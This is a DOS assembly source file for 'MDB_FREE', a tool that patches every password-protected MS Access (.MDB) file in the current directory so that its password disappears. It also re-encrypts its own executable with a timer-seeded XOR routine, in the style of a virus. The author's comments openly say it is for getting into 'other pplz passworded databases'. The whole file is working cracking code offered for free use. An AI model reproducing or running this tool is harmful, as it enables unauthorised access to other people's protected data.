;   (===========)
;   |  MDB FREE |
;   (===========)

; Be free my MDB! ;)
;
; MDB_FREE.... The Tool? Depends on what you expect! ;)

; MDB_FREE does what the sodding name says, sets free the
; MDB's (M$ ACCE$$ DATABA$E) in the current directory with
; passwords on them, It patches the file so the password
; magically "Disappears" :)

; This was coded in 5 seconds flat, I made this tool
; basically to get back into my databases to which I had
; lost the passwords, and to get into other pplz passworded
; databases

; This file must be called MDB_FREE.COM for it to run.
; Actually, that is a lie, you could create a 1 byte file
; called MDB_FREE.COM and run MDB_FREE, it will then create
; a new encrypted version of the program in that file.

; In fact, I don't know why I even bothered encrypting the
; damn executable, 'coz I'm now giving out the source... Oh
; who cares... Here's the source do WTF you want with it...
; It's served the purpose it was created for!

; Last Note : Those things called labels, ignore what their
;             called, it's not a virus (a label has infect)
;             Hahaha... Enjoy...

        .386
        .model tiny
        .code

start:  mov     bp,100h
        call    decrypt

deltz:  mov     ah,1Ah
        lea     dx,[bp+offset dta]
        int     21h

        mov     ah,4Eh
        mov     cx,7h
        lea     dx,[bp+offset myspc]
        int     21h
        jc      TellUserMyName

        mov     ax,3D02h
        lea     dx,[bp+offset dta+1Eh]
        int     21h
        jc      ImPissedOff
        mov     bx,ax

        call    writenewcode

        mov     ah,3Eh
        int     21h

        lea     dx,[bp+offset msg]
        mov     ah,09h
        int     21h

        call    cleara

        call    findfirst
        jc      endx
nxt:    call    checkforinfect
	lea	dx,[bp+offset dta+1Eh]
	mov	ah,09h
	int	21h
        call    cleara
        call    findnext
        jnc     nxt

endx:   mov     ax,4C00h
        int     21h

findfirst:
        mov     ah,4Eh
        mov     cx,7h
        lea     dx,[bp+offset fspex]
        int     21h
        ret

findnext:
        mov     ah,4Fh
        int     21h
        ret

checkforinfect:
        mov     ax,3D02h
        lea     dx,[bp+offset dta+1Eh]
        int     21h
        xchg    bx,ax

        mov     ax,4200h
        xor     cx,cx
        mov     dx,42h
        int     21h

        mov     ah,40h
        mov     cx,1h
        lea     dx,[bp+offset unres]
        int     21h
dones:
        mov     ah,3Eh
        int     21h
        ret

unres   db      86h
myspc   db      'MDB_FREE.COM',0
fspex   db      '*.MDB',0
msg     db      'Rat Heart''s MDB Password de-protector',0Dh,0Ah,0Dh,0Ah
        db      'Files being deprotected are -',0Dh,0Ah,'$'

mywarn  db      'This file MUST be called MDB_FREE.COM$'
annoyed db      'Error occured accessing MDB_FREE.COM... Quitting$'

TellUserMyName:
        mov     ah,09h
        lea     dx,[bp+offset mywarn]
        int     21h
        mov     ax,4C00h
        int     21h

ImPissedOff:
        mov     ah,09h
        lea     dx,[bp+offset annoyed]
        int     21h
        mov     ax,4C00h
        int     21h

cleara:
        mov     cx,20h
	mov	ax,'$$'
        lea     bx,[bp+offset dta+1Eh]
l:	mov	[bx],ax
	inc	bx
	inc	bx
	loop	l
        ret

decryptval      dw      0h

writenewcode:
        push    bx

        xor     dx,dx
        mov     es,dx
        mov     dx,es:046Ch
        mov     word ptr [bp+offset decryptval],dx

        call    decrypt

        pop     bx
        push    bx

        mov     ah,40h
        mov     cx,(offset writenewcode - offset start)
        lea     dx,[bp+offset start]
        int     21h

        call    decrypt

        pop     bx
        ret

decrypt:
        mov     cx,(offset decryptval - offset deltz)/2
        mov     bx,word ptr [bp+offset decryptval]
        lea     di,[bp+offset deltz]
decl:   xor     word ptr [di],bx
        inc     di
        inc     di
        loop    decl
        ret

heap:
dta     equ     $

        end     start
